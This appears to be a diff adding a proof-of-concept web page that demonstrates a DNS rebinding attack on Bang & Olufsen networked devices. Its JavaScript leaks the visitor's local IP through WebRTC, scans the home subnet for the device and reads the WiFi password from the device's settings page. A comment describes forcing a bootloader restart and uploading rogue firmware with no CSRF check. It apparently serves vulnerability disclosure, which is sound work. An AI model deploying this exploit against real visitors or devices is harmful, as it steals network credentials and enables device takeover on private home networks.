@@ -1,0 +1,170 @@
+<html>
+<head>
+    <title>DNS Rebinding demo for Bang &amp; Olufsen devices vulnerability</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
+    <script type="text/javascript">
+        var last_octet = 1;
+
+        function rtcGetPeerConnection() {
+            var RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection ||
+                window.webkitRTCPeerConnection;
+
+            if (!RTCPeerConnection) {
+                var iframe = document.createElement('iframe');
+                iframe.style.display = 'none';
+                document.body.appendChild(iframe);
+                var win = iframe.contentWindow;
+                window.RTCPeerConnection = win.RTCPeerConnection;
+                window.mozRTCPeerConnection = win.mozRTCPeerConnection;
+                window.webkitRTCPeerConnection = win.webkitRTCPeerConnection;
+                RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection ||
+                    window.webkitRTCPeerConnection;
+            }
+
+            if (typeof RTCPeerConnection === 'undefined')
+                return;
+
+            return RTCPeerConnection;
+        }
+
+        // WebRTC detection code taken from http://ipleak.net/static/js/index.js
+        function rtcDetection() {
+            var ip_dups = {};
+
+            var RTCPeerConnection = rtcGetPeerConnection();
+
+            var mediaConstraints = {
+                optional: [{
+                    RtpDataChannels: true
+                }]
+            };
+
+            var servers = undefined;
+
+            // Add the default Firefox STUN server for Chrome
+            if (window.webkitRTCPeerConnection)
+                servers = {
+                    iceServers: [{
+                        urls: "stun:stun.services.mozilla.com"
+                    }]
+                };
+
+            var pc = new RTCPeerConnection(servers, mediaConstraints);
+
+            // Listen for candidate events
+            pc.onicecandidate = function(ice) {
+                if (ice.candidate) {
+                    var ip_regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/
+                    var ip_addr_arr = ip_regex.exec(ice.candidate.candidate);
+                    if (ip_addr_arr && ip_addr_arr.length > 0) {
+                        var ip_addr = ip_addr_arr[1];
+                    } else return;
+
+                    // Remove duplicates
+                    if (ip_dups[ip_addr] === undefined) {
+                        if (ip_addr.startsWith("192.168")) {
+                            findBOLocalIP(ip_addr);
+                        }
+                    }
+
+                    ip_dups[ip_addr] = true;
+                }
+            };
+
+            pc.createDataChannel("");
+            pc.createOffer(function(result) {
+                pc.setLocalDescription(result, function() {},
+                    function() {});
+
+            }, function() {});
+        }
+
+        function findBOLocalIP(clientLocalIP) {
+            var ip_minus_last = clientLocalIP.substring(0, clientLocalIP.lastIndexOf('.'));
+            $('#ip_msg').text("Your local IP is " + clientLocalIP + ", scanning " + ip_minus_last + ".x subnet...");
+
+            // Try a /24 scan with 192.168.y.<i> with the exfiltrated y
+            setInterval(function() {
+                if (++last_octet < 255) {
+                    $("<img>", {
+                            src: "http://" + ip_minus_last + "." + last_octet +
+                                "/images/BO_processing_grey.gif",
+                            id: ip_minus_last + "." + last_octet,
+                        })
+                        .bind('load', function() {
+                            console.log("Found: " + this.id);
+                            exfiltrateWiFiPassword(this.id);
+                        }).appendTo($('#container'));
+                }
+            }, 500);
+
+            // Force to terminate stalled connections in order to avoid connection limit
+            setTimeout(function() {
+                setInterval(function() {
+                    $('#container').find(':first-child').unbind('load').attr('src', 'data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs=').remove();
+                }, 500);
+            }, 5000);
+        }
+
+        // Alternatively, you could get /1000/bo_restart_in_bsl.asp to trigger a
+        // restart in BSL mode, wait 30 seconds and upload your own firmware
+        // in /1000/bl_firmware_update.asp POSTing to
+        // /goform/formPostHandler a "uploadForm" form with a "appFirmware" file
+        // with enctype="multipart/form-data". No XSRF protection.
+        function exfiltrateWiFiPassword(ip) {
+            // Send internal IP "ip" to the attacker: we need to change
+            // the IP address of this attacker-controlled domain to the
+            // B&O internal IP.
+            // 
+            // THIS PART HAS NOT BEEN IMPLEMENTED BECAUSE IT IS NOT NECESSARY
+            // FOR DEMONSTRATION PURPOSES.
+
+            console.log("Exfiltrating WiFi password from " + ip + "...");
+            $('#ip_msg').text("B&O device found at " + ip + "!").fadeIn();
+
+            // Stop running scan...
+            last_octet = 255;
+
+            var WiFiPassword;
+            // Wait 70 seconds (60 seconds for cache invalidation + 10 grace seconds)
+            // and connect to the attacker-controlled host with the new IP.
+            setTimeout(function() {
+                    var interval = setInterval(function() {
+                        $.get("/1000/Bo_network_settings.asp" +
+                            '?dummy=' + Math.random(),
+                            function(data) {
+                                var start = data.lastIndexOf('top: -100px; display: none">');
+                                if (start == -1) {
+                                    return;
+                                }
+                                WiFiPassword = data.slice(start + 28);
+                                WiFiPassword = WiFiPassword.slice(0, WiFiPassword.indexOf('<'));
+                                alert('Password WiFi: ' + WiFiPassword);
+                                $('#ip_msg').text("WiFi password found: " + WiFiPassword);
+                                clearInterval(interval);
+                        });
+                    }, 5000);
+            }, 70000);
+        }
+
+        $(document).ready(rtcDetection);
+    </script>
+    <style type="text/css">
+        body {
+            font-family: Helvetica;
+        }
+        #container {
+            display: none;
+        }
+        #ip_msg {
+            font-weight: bold;
+            font-size: 20px;
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <p id="ip_msg"></p>
+    <div id="container"></div>
+</body>
+</html>
